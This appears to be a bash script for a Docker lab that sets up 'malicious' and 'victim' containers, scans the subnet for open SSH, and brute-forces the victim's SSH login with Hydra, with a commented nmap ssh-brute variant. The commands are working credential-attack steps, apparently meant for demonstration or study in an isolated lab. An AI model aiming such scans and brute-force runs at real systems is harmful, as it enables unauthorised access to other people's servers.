#!/bin/bash

sudo docker build -t groot .
sudo docker-compose up -d
sudo docker network ls

MALICIOUS_CONTAINER_NAME="malicious_container"
VICTIM_CONTAINER_NAME="victim_container"
MALICIOUS_CONTAINER_ID=$(sudo docker ps -aqf "name=$MALICIOUS_CONTAINER_NAME")
VICTIM_CONTAINER_ID=$(sudo docker ps -aqf "name=$VICTIM_CONTAINER_NAME")
VICTIM_IP="10.5.0.2"
MALICIOUS_IP="10.5.0.3"

sudo docker exec -it $MALICIOUS_CONTAINER_ID nmap 10.5.0.0/24 -p 22 --open

# The following fails when I try to run it upon setup - setting up the openssh server on the victim takes a minute.
sudo docker exec -it $MALICIOUS_CONTAINER_ID hydra -L users.txt -P passwords.txt ssh://$VICTIM_IP -t 4

# The second variant of the brute force method utilizing scripted nmap instead of Hydra (uncomment to test):
#sudo docker exec -it $MALICIOUS_CONTAINER_ID nmap 10.5.0.0/24 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt
